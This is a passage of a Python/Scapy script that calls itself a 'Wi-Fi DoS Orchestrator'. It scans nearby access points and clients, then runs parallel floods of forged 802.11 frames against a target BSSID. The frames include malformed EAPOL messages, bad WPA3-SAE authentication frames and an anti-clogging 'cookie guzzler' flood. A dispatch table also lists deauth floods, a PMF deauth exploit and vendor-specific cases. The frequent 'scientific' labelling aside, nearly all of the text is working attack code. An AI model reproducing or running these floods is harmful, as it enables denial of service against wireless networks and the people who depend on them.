            payload = b'\x02\x03\x00\x5f\x02\x00\x8a\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x01' + (b'\x00' * 80)
            for client in clients:
                pkt = RadioTap()/Dot11(type=2, subtype=8, addr1=client, addr2=bssid, addr3=bssid)/EAPOL(version=1, type=3)/payload
                burst.append(pkt)
            
            send_burst_scientific(burst * 10, interface, counter)
    except KeyboardInterrupt: 
        pass

# --- Generic WPA3-SAE Attacks ---

def run_bad_algo_generic_process(interface, counter, **kwargs):
    bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
    if not set_channel_scientific(interface, channel): 
        return
    
    print(f"[INFO-BAD-ALGO-SCIENTIFIC] {interface}: Starting Bad Algo (Generic)...")
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for _ in range(128):
                pkt = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=random.choice([0,1,2,4,5]))
                burst.append(pkt)
            
            send_burst_scientific(burst, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_bad_seq_generic_process(interface, counter, **kwargs):
    bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
    if not set_channel_scientific(interface, channel): 
        return
    
    print(f"[INFO-BAD-SEQ-SCIENTIFIC] {interface}: Starting Bad Seq (Generic)...")
    SAE_PAYLOAD = create_sae_payload_scientific(kwargs['scalar_hex'], kwargs['finite_hex'])
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for _ in range(128):
                pkt = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=random.choice([0,3,4]))/SAE_PAYLOAD
                burst.append(pkt)
            
            send_burst_scientific(burst, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_bad_status_code_generic_process(interface, counter, **kwargs):
    bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
    if not set_channel_scientific(interface, channel): 
        return
    
    print(f"[INFO-BAD-STATUS-GENERIC-SCIENTIFIC] {interface}: Starting Bad Status (Generic)...")
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for _ in range(128):
                pkt = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=random.randint(108, 200))
                burst.append(pkt)
            
            send_burst_scientific(burst, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_empty_frame_confirm_generic_process(interface, counter, **kwargs):
    bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
    if not set_channel_scientific(interface, channel): 
        return
    
    print(f"[INFO-EMPTY-GENERIC-SCIENTIFIC] {interface}: Starting Empty Frame (Generic)...")
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for _ in range(128):
                pkt = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=0)
                burst.append(pkt)
            
            send_burst_scientific(burst, interface, counter)
    except KeyboardInterrupt: 
        pass

def run_cookie_guzzler_process(interface, counter, **kwargs):
    """Cookie Guzzler: SAE Flooding to trigger Anti-Clogging"""
    bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
    if not set_channel_scientific(interface, channel): 
        return
    
    print(f"[INFO-COOKIE-SCIENTIFIC] {interface}: Starting Cookie Guzzler (Unique Bursts)...")
    SAE_PAYLOAD = create_sae_payload_scientific(kwargs['scalar_hex'], kwargs['finite_hex'])
    
    try:
        start_time = time.time()
        while (time.time() - start_time) < EXPERIMENT_DURATION:
            burst = []
            for _ in range(128):
                pkt = RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
                burst.append(pkt)
            
            send_burst_scientific(burst, interface, counter)
    except KeyboardInterrupt: 
        pass

# =====================================================================================
# ======================== MAIN FUNCTION (SCIENTIFICALLY CORRECTED) ==================
# =====================================================================================

def validate_configuration_scientific():
    """Validate configuration scientifically"""
    errors = []
    warnings = []
    
    def is_valid_bssid(bssid):
        if not bssid or bssid == "AA:BB:CC:DD:EE:11":
            return False
        parts = bssid.split(':')
        return len(parts) == 6 and all(len(p) == 2 for p in parts)
    
    def is_valid_hex(value):
        if not value or 'INSERT' in value:
            return False
        try:
            bytes.fromhex(value)
            return True
        except ValueError:
            return False
    
    if not is_valid_bssid(TARGET_BSSID_5GHZ):
        errors.append("TARGET_BSSID_5GHZ is not configured or invalid")
    
    if not is_valid_bssid(TARGET_BSSID_2_4GHZ):
        errors.append("TARGET_BSSID_2_4GHZ is not configured or invalid")
    
    if not is_valid_hex(SAE_SCALAR_2_4_HEX):
        errors.append("SAE_SCALAR_2_4_HEX is invalid (expected 32 bytes hex)")
    
    if not is_valid_hex(SAE_FINITE_2_4_HEX):
        errors.append("SAE_FINITE_2_4_HEX is invalid (expected 64 bytes hex)")
    
    if not is_valid_hex(SAE_SCALAR_5_HEX):
        errors.append("SAE_SCALAR_5_HEX is invalid")
    
    if not is_valid_hex(SAE_FINITE_5_HEX):
        errors.append("SAE_FINITE_5_HEX is invalid")
    
    if errors:
        print("\n[CRITICAL ERRORS]:")
        for error in errors:
            print(f"  ✗ {error}")
        return False
    
    if warnings:
        print("\n[WARNINGS]:")
        for warning in warnings:
            print(f"  ⚠ {warning}")
    
    print("\n[VALIDATION SUCCESSFUL]")
    print("  ✓ BSSIDs configured")
    print("  ✓ SAE parameters valid")
    print("  ✓ Adapters configured")
    print("  ✓ Scientific parameters set")
    
    return True

def main():
    if os.geteuid() != 0: 
        sys.exit("[ERROR-SCIENTIFIC] This script must be run with sudo privileges.")
    
    print("\n" + "="*80 + "\nWi-Fi DoS Orchestrator - SCIENTIFICALLY CORRECTED VERSION\n" + "="*80)
    
    # Scientific configuration validation
    print("\n[PHASE 1] SCIENTIFIC CONFIGURATION VALIDATION")
    print("="*80)
    
    if not validate_configuration_scientific():
        print("\n[ERROR] Configuration is not scientifically valid.")
        print("Please correct the configuration in the script.")
        sys.exit(1)
    
    cleanup({})
    
    current_ap_targets = {}
    current_client_targets = {'5ghz': [], '2.4ghz': []}
    procs = {}
    counters = {iface: Value('i', 0) for iface in ADAPTER_KONFIGURATION}

    try:
        print("\n[PHASE 2] SCIENTIFIC SCANNING")
        print("="*80)
        
        if SCANNER_INTERFACE:
            print(f"[INFO-SCIENTIFIC] Starting scientific channel & client scan with {SCANNER_INTERFACE}...")
            print(f"[INFO-SCIENTIFIC] Scan duration: {SCAN_DURATION} seconds")
            
            # Use scientific scanning function
            scan_result = run_airodump_scientific(SCANNER_INTERFACE, SCAN_DURATION)
            
            current_ap_targets = scan_result.get("aps", {})
            current_client_targets = scan_result.get("clients", {'5ghz': [], '2.4ghz': []})
            
            # Scientific: Evaluate results
            print("\n[SCAN RESULTS-SCIENTIFIC]")
            print(f"  5 GHz AP found: {'Yes' if '5ghz' in current_ap_targets else 'No'}")
            if '5ghz' in current_ap_targets:
                print(f"    BSSID: {current_ap_targets['5ghz']['bssid']}")
                print(f"    Channel: {current_ap_targets['5ghz']['channel']}")
                print(f"    Clients found: {len(current_client_targets['5ghz'])}")
            
            print(f"  2.4 GHz AP found: {'Yes' if '2.4ghz' in current_ap_targets else 'No'}")
            if '2.4ghz' in current_ap_targets:
                print(f"    BSSID: {current_ap_targets['2.4ghz']['bssid']}")
                print(f"    Channel: {current_ap_targets['2.4ghz']['channel']}")
                print(f"    Clients found: {len(current_client_targets['2.4ghz'])}")
            
            if not current_ap_targets:
                print("\n[WARNING-SCIENTIFIC] No target APs found. Fallback to manual configuration.")
        else:
            print("[INFO-SCIENTIFIC] Manual mode - No scanning")
        
        # Fallback to manual configuration if needed
        if not current_ap_targets:
            current_ap_targets = {
                '5ghz': {'bssid': TARGET_BSSID_5GHZ, 'channel': MANUELLER_KANAL_5GHZ},
                '2.4ghz': {'bssid': TARGET_BSSID_2_4GHZ, 'channel': MANUELLER_KANAL_2_4GHZ}
            }
            print("[INFO-SCIENTIFIC] Using manual channel configuration")

        print("\n" + "="*80 + "\n[PHASE 3] STARTING ATTACK PROCESSES (SCIENTIFICALLY)\n" + "="*80)
        
        ATTACK_FUNCTIONS = {
            "case1_denial_of_internet": run_case1_denial_of_internet_process,
            "case2_bad_auth_algo_broadcom": run_case2_bad_auth_algo_broadcom_process,
            "case3_bad_status_code": run_case3_bad_status_code_process,
            "case4_bad_send_confirm": run_case4_bad_send_confirm_process,
            "case5_empty_frame": run_case5_empty_frame_process,
            "case6_radio_confusion": run_case6_radio_confusion_process,
            "case6_radio_confusion_reverse": run_case6_radio_confusion_reverse_process,
            "case7_back_to_the_future": run_case7_back_to_the_future_process,
            "case8_bad_auth_algo_qualcomm": run_case8_bad_auth_algo_qualcomm_process,
            "case9_bad_sequence_number": run_case9_bad_sequence_number_process,
            "case10a_bad_auth_body_empty": run_case10a_bad_auth_body_empty_process,
            "case10b_bad_auth_body_payload": run_case10b_bad_auth_body_payload_process,
            "case11_seq_status_fuzz": run_case11_seq_status_fuzz_process,
            "case12_bursty_auth": run_case12_bursty_auth_process,
            "case13_radio_confusion_mediatek": run_case13_radio_confusion_mediatek_process,
            "case13_radio_confusion_mediatek_reverse": run_case13_radio_confusion_mediatek_reverse_process,
            "deauth_flood": run_deauth_flood_process,
            "pmf_deauth_exploit": run_pmf_deauth_exploit_process,
            "malformed_msg1_length": run_malformed_msg1_process,
            "malformed_msg1_flags": run_malformed_msg1_process,
            "bad_algo": run_bad_algo_generic_process,
            "bad_seq": run_bad_seq_generic_process,
            "bad_status_code": run_bad_status_code_generic_process,
            "empty_frame_confirm": run_empty_frame_confirm_generic_process,
            "cookie_guzzler": run_cookie_guzzler_process
        }

        # Start attack processes scientifically
        for interface, config in ADAPTER_KONFIGURATION.items():
            attack_type = config['angriff']
            band = config.get('band', '5GHz')
            
            if attack_type not in ATTACK_FUNCTIONS:
                print(f"[WARNING-SCIENTIFIC] {interface}: Unknown attack type '{attack_type}'")
                continue
            
            # Scientific parameter selection
            ap_info = current_ap_targets.get('5ghz' if band == '5GHz' else '2.4ghz')
            if not ap_info:
                print(f"[WARNING-SCIENTIFIC] {interface}: No target AP found for {band} band")
                continue

            # SAE parameters based on attack type
            if attack_type in ["case6_radio_confusion", "case13_radio_confusion_mediatek_reverse"]:
                scalar_to_use = SAE_SCALAR_5_HEX
                finite_to_use = SAE_FINITE_5_HEX
            elif attack_type in ["case6_radio_confusion_reverse", "case13_radio_confusion_mediatek"]:
                scalar_to_use = SAE_SCALAR_2_4_HEX
                finite_to_use = SAE_FINITE_2_4_HEX
            else:
                scalar_to_use = SAE_SCALAR_5_HEX if band == '5GHz' else SAE_SCALAR_2_4_HEX
                finite_to_use = SAE_FINITE_5_HEX if band == '5GHz' else SAE_FINITE_2_4_HEX

            kwargs = { 
                'bssid': ap_info['bssid'], 
                'channel': ap_info['channel'], 
                'scalar_hex': scalar_to_use, 
                'finite_hex': finite_to_use, 
                'attack_type': attack_type, 
                'clients': [] 
            }
            
            # Cross-band parameters for radio confusion attacks
            kwargs['bssid_5ghz'] = current_ap_targets.get('5ghz', {}).get('bssid')
            kwargs['channel_5ghz'] = current_ap_targets.get('5ghz', {}).get('channel')
            kwargs['bssid_2_4ghz'] = current_ap_targets.get('2.4ghz', {}).get('bssid')
            kwargs['channel_2_4ghz'] = current_ap_targets.get('2.4ghz', {}).get('channel')

            # Client selection logic (scientifically correct)
            if attack_type in ["case6_radio_confusion", "case13_radio_confusion_mediatek_reverse"]: 
                kwargs['clients'] = TARGET_STA_MACS_5GHZ_SPECIAL or current_client_targets['5ghz']
            elif attack_type in ["case6_radio_confusion_reverse", "case13_radio_confusion_mediatek"]: 
                kwargs['clients'] = TARGET_STA_MACS_2_4GHZ_SPECIAL or current_client_targets['2.4ghz']
            elif attack_type not in ["case2_bad_auth_algo_broadcom", "bad_algo", "bad_seq", 
                                   "bad_status_code", "empty_frame_confirm", "cookie_guzzler", 
                                   "case7_back_to_the_future"]:
                kwargs['clients'] = TARGET_STA_MACS or current_client_targets['5ghz' if band == '5GHz' else '2.4ghz']

            # Validate client requirements
            needs_clients = "clients" in kwargs and attack_type not in [
                "case2_bad_auth_algo_broadcom", "bad_algo", "bad_seq", 
                "bad_status_code", "empty_frame_confirm", "cookie_guzzler", 
                "case7_back_to_the_future"
            ]
            
            if needs_clients and not kwargs['clients']:
                print(f"[WARNING-SCIENTIFIC] {interface}: Attack requires clients but none available")
                continue
            
            print(f"[START-SCIENTIFIC] {interface} ({band}): {attack_type}")
            print(f"  BSSID: {kwargs['bssid']}")
            print(f"  Channel: {kwargs['channel']}")
            print(f"  Clients: {len(kwargs['clients'])}")
            
            target_func = ATTACK_FUNCTIONS[attack_type]
            p = Process(target=target_func, args=(interface, counters[interface]), kwargs=kwargs)
            p.start()
            procs[interface] = p

        if not any(isinstance(p, Process) for p in procs.values()):
            sys.exit("\n[ERROR-SCIENTIFIC] No attack processes could be started (missing targets?).")

        print("\n" + "="*80 + 
              f"\n[INFO-SCIENTIFIC] {len([p for p in procs.values() if isinstance(p, Process)])} "
              f"attack processes started. Press Ctrl+C to stop.\n" + "="*80)
        
        # Scientific monitoring loop
        try:
            start_time = time.time()
            while any(p.is_alive() for p in procs.values() if isinstance(p, Process)):
                elapsed = time.time() - start_time
                status_lines = []
                
                for interface in ADAPTER_KONFIGURATION:
                    if interface in procs and procs[interface].is_alive():
                        packet_count = counters[interface].value
                        rate = packet_count / elapsed if elapsed > 0 else 0
                        status_lines.append(
                            f"{interface}: {packet_count:6d} pkts "
                            f"({rate:6.1f} pps)"
                        )
                
                sys.stdout.write(f"\r[SCIENTIFIC-MONITOR] {elapsed:6.1f}s | " + 
                               " | ".join(status_lines) + " " * 20)
                sys.stdout.flush()
                
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print("\n\n[INFO-SCIENTIFIC] Experiment stopped by user.")
            
    except KeyboardInterrupt:
        print("\n[INFO-SCIENTIFIC] User cancellation detected.")
    finally:
        cleanup(procs)
        print("\n[INFO-SCIENTIFIC] Scientific cleanup completed.")
        print("="*80)

if __name__ == "__main__":
    main()
